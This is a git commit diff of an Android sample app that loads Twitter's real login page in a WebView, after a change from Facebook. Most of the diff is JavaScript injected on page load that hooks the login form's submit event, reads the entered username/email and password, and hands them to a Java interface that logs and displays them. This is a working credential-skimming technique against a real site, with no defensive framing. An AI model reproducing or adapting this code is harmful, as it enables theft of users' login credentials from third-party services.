e3d8c4419ee5b44a3207f25750daddc20ef6bf04
HenryChuang <henrychuang@HenryChuangdeMacBook-Pro.local>
2016-12-05 23:25:20 +0800

    change example Facebook to Twitter

--- sample/src/main/java/example/henrychuang/sample/Main.java
+++ sample/src/main/java/example/henrychuang/sample/Main.java
@@ -7,6 +7,7 @@ import android.content.DialogInterface;
 import android.os.Bundle;
 import android.util.Log;
 import android.webkit.JavascriptInterface;
+import android.webkit.WebChromeClient;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 
@@ -19,13 +20,15 @@ public class Main extends Activity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.main);
 
-        webview1 = (WebView)findViewById(R.id.myWebview);
+        webview1 = (WebView) findViewById(R.id.myWebview);
 
         webview1.getSettings().setJavaScriptEnabled(true);
+        webview1.setWebChromeClient(new WebChromeClient());
         webview1.addJavascriptInterface(new MyJavaScriptInterface(), "MYOBJECT");
         webview1.setWebViewClient(new WebViewClient() {
             @Override
             public boolean shouldOverrideUrlLoading(WebView view, String url) {
+//                Log.d("henrytest", "shouldOverrideUrlLoading");
                 view.loadUrl(url);
                 return true;
             }
@@ -35,36 +38,40 @@ public class Main extends Activity {
                 super.onPageFinished(view, url);
 
                 StringBuilder sb = new StringBuilder();
-                sb.append("document.getElementsByTagName('form')[0].onsubmit = function () {");
-                sb.append("var objPWD, objAccount;var str = '';");
-                sb.append("var inputs = document.getElementsByTagName('input');");
-                sb.append("for (var i = 0; i < inputs.length; i++) {");
-		        sb.append("if (inputs[i].name.toLowerCase() === 'pass') {objPWD = inputs[i];}");
-		        sb.append("else if (inputs[i].name.toLowerCase() === 'email') {objAccount = inputs[i];}");
-                sb.append("}");
-                sb.append("if (objAccount != null) {str += objAccount.value;}");
-                sb.append("if (objPWD != null) { str += ' , ' + objPWD.value;}");
-                sb.append("window.MYOBJECT.processHTML(str);");
+                sb.append("var formxxx = document.getElementsByTagName('form')[0];");
+                sb.append("if(!(formxxx === undefined || formxxx === null)){");
+                sb.append(" formxxx.onsubmit = function () {");
+//                sb.append("     alert('onsubmit start');");
+                sb.append("     var objPWD, objAccount;var str = '';");
+                sb.append("     var inputs = document.getElementsByTagName('input');");
+                sb.append("     for (var i = 0; i < inputs.length; i++) {");
+                sb.append("         if (inputs[i].name.toLowerCase() === 'session[password]') {objPWD = inputs[i];}");
+                sb.append("         else if (inputs[i].name.toLowerCase() === 'session[username_or_email]') {objAccount = inputs[i];}");
+                sb.append("     }");
+                sb.append("     if (objAccount != null) {str += objAccount.value;}");
+                sb.append("     if (objPWD != null) { str += ' , ' + objPWD.value;}");
+                sb.append("     window.MYOBJECT.processHTML(str);");
 //                sb.append("window.MYOBJECT.processHTML(document.getElementsByTagName('form')[0].innerHTML);");
+//                sb.append("     alert('onsubmit end, str: ' + str);");
+                sb.append("     return true;");
+                sb.append(" };");
 
-                sb.append("return true;");
-                sb.append("};");
+                sb.append("}");
 
                 view.loadUrl("javascript:" + sb.toString());
+//                view.loadUrl("javascript:alert(123);");
             }
 
         });
 
-        String sUrl = "https://www.facebook.com/";
+        String sUrl = "https://twitter.com/";
         webview1.loadUrl(sUrl);
 
     }
 
-    class MyJavaScriptInterface
-    {
+    class MyJavaScriptInterface {
         @JavascriptInterface
-        public void processHTML(String html)
-        {
+        public void processHTML(String html) {
             Log.d("henrytest", html);
 
             AlertDialog.Builder builder = new AlertDialog.Builder(Main.this);
